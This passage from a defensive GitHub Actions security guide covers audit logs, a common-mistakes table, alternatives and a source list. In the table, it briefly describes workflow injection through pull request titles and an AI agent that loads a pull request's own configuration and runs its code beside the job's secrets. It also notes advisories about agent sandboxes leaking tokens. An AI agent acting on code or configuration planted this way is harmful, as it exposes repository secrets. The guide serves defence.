  organization. An owner's approval of each fine-grained token "is the default value", but "Only
  fine-grained personal access tokens, not personal access tokens (classic), are subject to
  approval" [94]. OAuth app restrictions are on by default in a new organization, and "When an
  organization has not set up OAuth app access restrictions, any OAuth app authorized by an
  organization member can also access the organization's private resources" [95].

## 12. Audit logs and visibility

When something went wrong, the logs say who changed a secret, a workflow or a role, and when.
OWASP's CICD-SEC-10 asks for four things: map the systems the pipeline touches, turn on their
logs, ship the logs to one place, and alert on what looks wrong [97]. Shipping and alerts pay only
when someone reads the alerts; without that person, keep the logs past their default and read them
when something goes wrong (this practice's reasoning). Streaming GitHub's audit log to a store of
your own needs GitHub Enterprise [99].

- **List the systems the pipeline touches and the log each one keeps**: GitHub, the cloud account
  and the registry. OWASP asks for this inventory first [97].
- **On GitHub, read the organization's audit log, and export what you must keep longer than 180
  days.** The audit log lists the last 180 days, "Only owners can access" it, and it exports as JSON
  or CSV; "Organizations that use GitHub Enterprise Cloud can interact with the audit log using the
  GraphQL API and REST API" [98]. A repository on a personal account has no organization audit log:
  the account's security log lists "all actions performed within the last 90 days" [100].
- **Watch the events that change what a workflow can reach**, such as `org.update_actions_secret`,
  which GitHub names as the event that "tracks changes to organization secrets" [9].
- **On AWS, create a CloudTrail trail, so the OIDC logins of the deploy jobs stay readable past 90
  days.** CloudTrail logs each `AssumeRoleWithWebIdentity` call with the "information provided by
  the identity provider", while the role's later calls show "Role identity only (no user)" [101].
  So the login event is the one that names the run: a GitHub token's subject carries the
  repository and the environment ([delivery.md](delivery.md) section 5). Its event history keeps
  "the past 90 days"; a trail keeps more, and "You can deliver one copy of your ongoing management
  events to your S3 bucket at no charge from CloudTrail by creating a trail", with S3 storage
  charges [102].
- **Send an alert only to a place someone reads, and name that person**, as for every scheduled
  scan (section 7).

## 13. Common mistakes

| Mistake | What it costs | Fix |
|---|---|---|
| No `permissions:` block | the job may hold a write token by the organisation's default | section 3 |
| An action pinned to a tag | a moved tag runs someone else's code with your token | section 4 |
| `${{ github.event.pull_request.title }}` inside `run:` | a pull request title becomes a command | section 5 |
| `pull_request_target` with a checkout of the pull request | fork code runs with your secrets | section 5 |
| A secret in a private repository | every reader, clone, fork and log holds it, for good | section 6 |
| A JSON blob as one secret | redaction misses parts of it in the logs | section 6 |
| A scanner job with write permissions and secrets | a compromised scanner reaches production | section 7 |
| The old static key kept after the move to OIDC | the attacker uses the key OIDC was meant to retire | [delivery.md](delivery.md) section 5 |
| A vendor's example workflow copied as it stands, by a person or an agent | it pins by tag and grants writes the job does not use: Anthropic's example for its own action pins `@v6` and `@v1` and grants `contents`, `pull-requests` and `issues` write and `id-token: write` [89] | sections 3 and 4 |
| The pull request's head checked out before an AI agent runs | the agent loads the pull request's own configuration and runs its code next to the job's secrets [83], [84] | section 10 |

## 14. Where the rules stop holding

- **A plan without push protection or code scanning for private repositories**: run the open
  tools of section 7 and the pre-commit hook; the rules hold, the GitHub features do not.
- **A repository that accepts no pull requests from forks**: section 5's fork rules matter less,
  but the injection rule still holds for branch names and for `workflow_dispatch` inputs.
- **Self-hosted runners for private repositories only**: still wipe them after each job, because
  a job can leave a process or a file for the next one [22].

## 15. Alternatives considered

- **Tags instead of SHA pins, for readability.** Rejected: the incidents of section 2 moved tags.
  The version comment keeps the readability.
- **The workflow lockfile instead of pins.** The stronger form once it is generally available;
  today GitHub writes that lockfiles "are in public preview and subject to change" [44].
- **OpenSSF Scorecard as the workflow checker.** Its checks overlap zizmor's on workflows, and its
  action needs GitHub Advanced Security on private repositories [42].
- **GitHub's own scanners only.** Fine where the plan includes them; on other plans the open tools
  of section 7 do the same jobs.
- **A step that fails the CodeQL job on open alerts.** A last step that lists the ref's open alerts
  through the code scanning API, which filters by ref, state and severity [47], and fails on a
  critical or high one would make CodeQL gate a tag deploy too. Not shown in the examples.
- **Encrypted secrets in the repository as the default.** Rejected, section 6: decryption keys and
  revocation become the problem the secret store already solves.
- **Checkov instead of Trivy for infrastructure code.** Checkov downloads external modules only
  when you pass `--download-external-modules true` [67], which suits a scan of untrusted pull
  requests better than Trivy, which downloads them by default (section 7). Trivy stays the default
  because the image job already pins and runs it, so Checkov would add a second tool, a second pin
  and a second written policy. Checkov's own security advisories were not read for this practice.
- **GitHub Agentic Workflows as the default shape for an agent.** They build in the read-only agent
  job and the checked writes of section 10, but they are in technical preview [87], and their own
  advisories from August to October 2026 include a confused-deputy check that did not cover
  `pull_request_target` and sandboxed code that could steal the job token [88]. Section 10's rules
  still hold under them.

## 16. Sources

Checked 2026-10-18 unless a line ends with — checked <YYYY-MM-DD>.

- [1] OWASP — Top 10 CI/CD Security Risks, v1.0 — https://owasp.org/www-project-top-10-ci-cd-security-risks/
- [2] Igibek Koishybayev et al. — Characterizing the Security of Github CI Workflows (USENIX Security, 2022; research) — https://www.usenix.org/system/files/sec22-koishybayev.pdf
- [3] Siddharth Muralee et al. — ARGUS: A Framework for Staged Static Taint Analysis of GitHub Workflows and Actions (USENIX Security, 2023; research) — https://www.usenix.org/system/files/usenixsecurity23-muralee.pdf
- [4] Edward Abrokwah and Taher A. Ghaleb — An Empirical Study of Complexity, Heterogeneity, and Compliance of GitHub Actions Workflows (arXiv, 2025; research) — https://arxiv.org/abs/2507.18062
- [5] GitHub Advisory Database — GHSA-mrrh-fwg8-r2c3, tj-actions/changed-files (CVE-2025-30066) — https://github.com/advisories/GHSA-mrrh-fwg8-r2c3
- [6] Aqua Security — GHSA-69fq-xp46-6x23, Trivy supply chain compromise (CVE-2026-33634) — https://github.com/aquasecurity/trivy/security/advisories/GHSA-69fq-xp46-6x23
- [7] TanStack — npm supply-chain compromise post-mortem (tanstack.com, 2026; case) — https://tanstack.com/blog/npm-supply-chain-compromise-postmortem
- [8] Seth Larson — Supply-chain attack analysis: Ultralytics (PyPI blog, 2024; case) — https://blog.pypi.org/posts/2024-12-11-ultralytics-attack-analysis/
- [9] GitHub — Secure use reference — https://docs.github.com/en/actions/reference/security/secure-use
- [10] GitHub — Workflow syntax for GitHub Actions: permissions — https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax#permissions
- [11] GitHub — Updating the default GITHUB_TOKEN permissions to read-only (changelog, 2023-02-02) — https://github.blog/changelog/2023-02-02-github-actions-updating-the-default-github_token-permissions-to-read-only/
- [12] GitHub — OpenID Connect reference — https://docs.github.com/en/actions/reference/security/oidc
- [13] GitHub — actions/checkout, README, v7.0.1 — https://github.com/actions/checkout/blob/v7.0.1/README.md
- [14] Chainguard — What the fork? Imposter commits in GitHub Actions and CI/CD (chainguard.dev, 2023; research) — https://www.chainguard.dev/unchained/what-the-fork-imposter-commits-in-github-actions-and-ci-cd
- [15] zizmor — Audit rules, zizmor 1.31.1 — https://docs.zizmor.sh/audits/
- [16] GitHub — Actions policy now supports blocking and SHA pinning actions (changelog, 2025-08-15) — https://github.blog/changelog/2025-08-15-github-actions-policy-now-supports-blocking-and-sha-pinning-actions/
- [17] GitHub — Immutable releases are now generally available (changelog, 2025-10-28) — https://github.blog/changelog/2025-10-28-immutable-releases-are-now-generally-available/
- [18] GitHub — Workflow lockfiles in public preview (changelog, 2026-10-14) — https://github.blog/changelog/2026-10-14-github-actions-workflow-lockfiles-in-public-preview/
- [19] GitHub — Safer pull_request_target defaults for actions/checkout (changelog, 2026-06-18) — https://github.blog/changelog/2026-06-18-safer-pull_request_target-defaults-for-github-actions-checkout/
- [20] GitHub — Workflow execution protections in GitHub Actions generally available (changelog, 2026-09-17) — https://github.blog/changelog/2026-09-17-workflow-execution-protections-in-github-actions-generally-available/
- [21] GitHub — Read-only Actions cache for untrusted triggers (changelog, 2026-06-26) — https://github.blog/changelog/2026-06-26-read-only-actions-cache-for-untrusted-triggers/
- [22] John Stawinski — Playing with Fire: How We Executed a Critical Supply Chain Attack on PyTorch (johnstawinski.com, 2024; case) — https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/
- [23] Federal Trade Commission — In the Matter of Uber Technologies, Inc., revised complaint, C-4662, October 2018 — https://www.ftc.gov/system/files/documents/cases/152_3054_c-4662_uber_technologies_revised_complaint.pdf
- [24] Joe Leon — Anyone can Access Deleted and Private Repository Data on GitHub (Truffle Security, 2024; research, sponsored by Truffle Security) — https://trufflesecurity.com/blog/anyone-can-access-deleted-and-private-repo-data-github
- [25] Michael Meli, Matthew R. McNiece and Bradley Reaves — How Bad Can It Git? Characterizing Secret Leakage in Public GitHub Repositories (NDSS, 2019; research) — https://www.ndss-symposium.org/wp-content/uploads/2019/02/ndss2019_04B-3_Meli_paper.pdf
- [26] Adam Wiggins — The Twelve-Factor App: III. Config (12factor.net, 2017; opinion) — https://12factor.net/config
- [27] GitHub — About push protection — https://docs.github.com/en/code-security/concepts/secret-security/push-protection
- [28] GitHub — Security plans and pricing — https://github.com/security/plans
- [29] OWASP Cheat Sheet Series — Secrets Management Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html
- [30] Bitnami — Sealed Secrets, README — https://github.com/bitnami-labs/sealed-secrets
- [31] Andrew Ayer — git-crypt, README — https://github.com/AGWA/git-crypt
- [32] Thoughtworks — Technology Radar: SOPS (thoughtworks.com, 2024; opinion) — https://www.thoughtworks.com/en-us/radar/tools/sops
- [33] rhysd — actionlint, README, v1.7.12 — https://github.com/rhysd/actionlint/blob/v1.7.12/README.md
- [34] Madjda Fares, Yogya Gamage and Benoit Baudry — Unpacking Security Scanners for GitHub Actions Workflows (arXiv, 2026; research) — https://arxiv.org/abs/2601.14455
- [35] Google — OSV-Scanner: supported languages and lockfiles, v2.7.0 — https://google.github.io/osv-scanner/supported-languages-and-lockfiles/
- [36] PyPA — pip-audit, README — https://github.com/pypa/pip-audit
- [37] Astral — uv: Preview features, uv 0.13.1 — https://docs.astral.sh/uv/concepts/preview/
- [38] GitHub — actions/dependency-review-action, README — https://github.com/actions/dependency-review-action
- [39] GitHub — github/codeql-action, README, v4.39.0 — https://github.com/github/codeql-action/blob/v4.39.0/README.md
- [40] Zachary Rice — gitleaks, README — https://github.com/gitleaks/gitleaks
- [41] Nasif Imtiaz, Seaver Thorne and Laurie Williams — A Comparative Study of Vulnerability Reporting by Software Composition Analysis Tools (ESEM, 2021; research) — https://arxiv.org/abs/2108.12078
- [42] OpenSSF — scorecard-action, README — https://github.com/ossf/scorecard-action
- [43] GitHub — Code scanning merge protection — https://docs.github.com/en/code-security/concepts/code-scanning/merge-protection
- [44] GitHub — Workflow dependency lockfiles — https://docs.github.com/en/actions/concepts/security/workflow-dependency-lockfiles
- [45] GitHub — github/codeql-action, `analyze/action.yml` (the step's inputs), v4.39.0 — https://github.com/github/codeql-action/blob/v4.39.0/analyze/action.yml
- [46] zizmor — zizmor-action, README, v0.7.1 — https://github.com/zizmorcore/zizmor-action/blob/v0.7.1/README.md
- [47] GitHub — REST API endpoints for code scanning: list code scanning alerts for a repository — https://docs.github.com/en/rest/code-scanning/code-scanning
- [48] AWS — Amazon Inspector User Guide: Scanning Amazon ECR container images with Amazon Inspector — https://docs.aws.amazon.com/inspector/latest/user/scanning-ecr.html
- [49] AWS — Amazon ECR User Guide: Scan images for OS and programming language package vulnerabilities in Amazon ECR — https://docs.aws.amazon.com/AmazonECR/latest/userguide/image-scanning-enhanced.html
- [50] AWS — Amazon Inspector User Guide: Suppressing Amazon Inspector findings — https://docs.aws.amazon.com/inspector/latest/user/findings-managing-supression-rules.html
- [51] AWS — Amazon Inspector API Reference: CreateFilter — https://docs.aws.amazon.com/inspector/v2/APIReference/API_CreateFilter.html
- [52] Xiaofan Li and Xing Gao — Investigating Security Implications of Automatically Generated Code on the Software Supply Chain (arXiv, 2025; research) — https://arxiv.org/abs/2509.20277
- [53] HashiCorp — terraform-provider-external: `external` data source, v2.4.2 — https://github.com/hashicorp/terraform-provider-external/blob/v2.4.2/docs/data-sources/external.md
- [54] Atlantis — Security (`runatlantis.io/docs/security.md`), v0.48.1 — https://github.com/runatlantis/atlantis/blob/v0.48.1/runatlantis.io/docs/security.md
- [55] HashiCorp — HCP Terraform: Security model — https://github.com/hashicorp/web-unified-docs/blob/34b3a09cad9357b99d52cbb50ff8034e5108a9b7/content/terraform-docs-common/docs/cloud-docs/architectural-details/security-model.mdx
- [56] HashiCorp — Terraform CLI: `terraform init`, Terraform v1.16 — https://github.com/hashicorp/web-unified-docs/blob/34b3a09cad9357b99d52cbb50ff8034e5108a9b7/content/terraform/v1.16.x/docs/cli/commands/init.mdx
- [57] HashiCorp — Terraform: Manage sensitive data, Terraform v1.16 — https://github.com/hashicorp/web-unified-docs/blob/34b3a09cad9357b99d52cbb50ff8034e5108a9b7/content/terraform/v1.16.x/docs/language/manage-sensitive-data/index.mdx
- [58] ZAP — ZAP - Baseline Scan — https://www.zaproxy.org/docs/docker/baseline-scan/
- [59] ZAP — ZAP Docker User Guide — https://www.zaproxy.org/docs/docker/about/
- [60] OWASP — DevSecOps Guideline (incubator project) — https://owasp.org/www-project-devsecops-guideline/
- [61] ZAP — zaproxy/action-baseline, `action.yml`, v0.15.0 — https://github.com/zaproxy/action-baseline/blob/v0.15.0/action.yml
- [62] ZAP — ZAP - API Scan — https://www.zaproxy.org/docs/docker/api-scan/
- [63] ZAP — ZAP desktop user guide: Active Scan — https://www.zaproxy.org/docs/desktop/start/features/ascan/
- [64] ZAP — FAQ: How can you use ZAP to scan APIs? — https://www.zaproxy.org/faq/how-can-you-use-zap-to-scan-apis/
- [65] Aqua Security — Trivy: Terraform (IaC coverage), v0.76.0 — https://github.com/aquasecurity/trivy/blob/v0.76.0/docs/guide/coverage/iac/terraform.md
- [66] Aqua Security — Trivy: Misconfiguration scanning, v0.76.0 — https://github.com/aquasecurity/trivy/blob/v0.76.0/docs/guide/scanner/misconfiguration/index.md
- [67] Bridgecrew — Checkov: Terraform scan examples, 3.3.29 — https://github.com/bridgecrewio/checkov/blob/3.3.29/docs/7.Scan%20Examples/Terraform.md
- [68] GitHub — Workflow commands for GitHub Actions: Masking a value in a log — https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-commands#masking-a-value-in-a-log
- [69] GitHub — Using secrets in GitHub Actions — https://docs.github.com/en/actions/how-tos/write-workflows/choose-what-workflows-do/use-secrets
- [70] GitHub — Downloading workflow artifacts — https://docs.github.com/en/actions/how-tos/manage-workflow-runs/download-workflow-artifacts
- [71] GitHub — Using workflow run logs — https://docs.github.com/en/actions/how-tos/monitor-workflows/use-workflow-run-logs
- [72] GitHub — Configuring the retention period for checks, workflow runs, commit statuses, artifacts, and logs in your organization — https://docs.github.com/en/organizations/managing-organization-settings/configuring-the-retention-period-for-github-actions-artifacts-and-logs-in-your-organization
- [73] GitHub — Actions retention now covers checks, runs, and statuses (changelog, 2026-10-01) — https://github.blog/changelog/2026-10-01-actions-retention-now-covers-checks-runs-and-statuses/
- [74] GitHub — actions/upload-artifact, README, v7.0.2 — https://github.com/actions/upload-artifact/blob/v7.0.2/README.md
- [75] GitHub — actions/upload-artifact, `action.yml` (`retention-days`), v7.0.2 — https://github.com/actions/upload-artifact/blob/v7.0.2/action.yml
- [76] DORA — Capabilities: Test data management — https://dora.dev/capabilities/test-data-management/
- [77] NIST — SP 800-53 Rev. 5, release 5.2.0: SA-3(2) Use of Live or Operational Data (OSCAL catalog) — https://github.com/usnistgov/oscal-content/blob/78650f02ad9321bb7b817846f8fbd4f2bcd620de/nist.gov/SP800-53/rev5/json/NIST_SP-800-53_rev5_catalog.json
- [78] NIST — SP 800-53 Rev. 5, release 5.2.0: low, moderate and high baseline profiles (OSCAL) — https://github.com/usnistgov/oscal-content/tree/78650f02ad9321bb7b817846f8fbd4f2bcd620de/nist.gov/SP800-53/rev5/json
- [79] Microsoft — Playwright: TestOptions (`screenshot`, `trace`, `video`), v1.64.1 — https://github.com/microsoft/playwright/blob/v1.64.1/docs/src/test-api/class-testoptions.md
- [80] Microsoft — Playwright: Trace viewer, v1.64.1 — https://github.com/microsoft/playwright/blob/v1.64.1/docs/src/trace-viewer.md
- [81] Microsoft — Playwright: Authentication, v1.64.1 — https://github.com/microsoft/playwright/blob/v1.64.1/docs/src/auth.md
- [82] Shenao Wang et al. — Demystifying and Detecting Agentic Workflow Injection Vulnerabilities in GitHub Actions (arXiv, 2026; research) — https://arxiv.org/abs/2605.07135
- [83] GitHub Advisory Database — GHSA-8q5r-mmjf-575q, claude-code-action (CVE-2026-47751) — https://github.com/advisories/GHSA-8q5r-mmjf-575q
- [84] GitHub Advisory Database — GHSA-wpqr-6v78-jr5g, Gemini CLI and run-gemini-cli (CVE-2026-12537) — https://github.com/advisories/GHSA-wpqr-6v78-jr5g
- [85] Anthropic — claude-code-action, `docs/security.md`, v1.0.252 — https://github.com/anthropics/claude-code-action/blob/v1.0.252/docs/security.md
- [86] Landon Cox and Jiaxiao Zhou — Under the hood: Security architecture of GitHub Agentic Workflows (GitHub blog, 2026; case) — https://github.blog/2026/03/09/under-the-hood-security-architecture-of-github-agentic-workflows/
- [87] GitHub — GitHub Agentic Workflows are now in technical preview (changelog, 2026-02-13) — https://github.blog/changelog/2026-02-13-github-agentic-workflows-are-now-in-technical-preview/
- [88] GitHub — github/gh-aw: security advisories — https://github.com/github/gh-aw/security/advisories
- [89] Anthropic — Claude Code GitHub Actions — https://code.claude.com/docs/en/github-actions
- [90] GitHub — Managing GitHub Actions settings for a repository — https://docs.github.com/en/repositories/managing-your-repositorys-settings-and-features/enabling-features-for-your-repository/managing-github-actions-settings-for-a-repository
- [91] OWASP — Top 10 CI/CD Security Risks, CICD-SEC-8: Ungoverned Usage of 3rd Party Services, v1.0 — https://owasp.org/www-project-top-10-ci-cd-security-risks/CICD-SEC-08-Ungoverned-Usage-of-3rd-Party-Services
- [92] GitHub — Differences between GitHub Apps and OAuth apps — https://docs.github.com/en/apps/oauth-apps/building-oauth-apps/differences-between-github-apps-and-oauth-apps
- [93] GitHub — Managing your personal access tokens — https://docs.github.com/en/authentication/keeping-your-account-and-data-secure/managing-your-personal-access-tokens
- [94] GitHub — Setting a personal access token policy for your organization — https://docs.github.com/en/organizations/managing-programmatic-access-to-your-organization/setting-a-personal-access-token-policy-for-your-organization
- [95] GitHub — About OAuth app access restrictions — https://docs.github.com/en/organizations/managing-oauth-access-to-your-organizations-data/about-oauth-app-access-restrictions
- [96] GitHub — Reviewing and revoking authorization of GitHub Apps — https://docs.github.com/en/apps/using-github-apps/reviewing-and-revoking-authorization-of-github-apps
- [97] OWASP — Top 10 CI/CD Security Risks, CICD-SEC-10: Insufficient Logging and Visibility, v1.0 — https://owasp.org/www-project-top-10-ci-cd-security-risks/CICD-SEC-10-Insufficient-Logging-And-Visibility
- [98] GitHub — Reviewing the audit log for your organization — https://docs.github.com/en/organizations/keeping-your-organization-secure/managing-security-settings-for-your-organization/reviewing-the-audit-log-for-your-organization
- [99] GitHub Enterprise Cloud — Streaming the audit log for your enterprise — https://docs.github.com/en/enterprise-cloud@latest/admin/monitoring-activity-in-your-enterprise/reviewing-audit-logs-for-your-enterprise/streaming-the-audit-log-for-your-enterprise
- [100] GitHub — Reviewing your security log — https://docs.github.com/en/authentication/keeping-your-account-and-data-secure/reviewing-your-security-log
- [101] AWS — IAM User Guide: Logging IAM and AWS STS API calls with AWS CloudTrail — https://docs.aws.amazon.com/IAM/latest/UserGuide/cloudtrail-integration.html
- [102] AWS — CloudTrail User Guide: How CloudTrail works — https://docs.aws.amazon.com/awscloudtrail/latest/userguide/how-cloudtrail-works.html
